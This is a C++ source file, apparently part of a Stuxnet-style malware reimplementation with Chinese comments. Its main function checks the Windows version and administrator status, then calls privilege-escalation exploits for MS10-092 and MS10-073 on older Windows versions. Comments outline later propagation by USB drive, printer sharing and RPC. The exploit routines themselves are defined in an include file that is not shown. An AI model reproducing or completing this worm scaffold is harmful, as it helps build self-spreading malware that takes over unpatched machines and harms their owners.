// stuxnet_exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include"include.h"


int main()
{
    TargetInfo info;
    check_target_info(info);
    printf("current dwMajorVersion:%d dwMinorVersion: %d bIsWow64:%d", info.dwMajorVersion, info.dwMinorVersion, info.bIsWow64);
    
    if (check_admin() == FALSE)
    {
        //提权操作
        if (info.dwMajorVersion == 6 && info.dwMinorVersion<=1)
        {
            //[ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
            exp_ms10_092();
        }
        else if(info.dwMajorVersion == 5 && info.dwMinorVersion <= 2)
        {
            //[ 'Windows 2000', 'Windows XP' ]
            if(info.dwMinorVersion==0)
                exp_ms10_073(false);
            else
            {
                DWORD dwThread = 0;
                bool isXP = true;
                HANDLE thread=CreateThread(NULL, 0, exp_ms10_073, &isXP, 0, &dwThread);
                WaitForSingleObject(thread,INFINITE);
            }
        }
    }

    //本地存储传播-U盘传播

    //内网传播--打印机共享传播
    //内网传播--rpc传播
    
    system("pause");
    return 0;
}
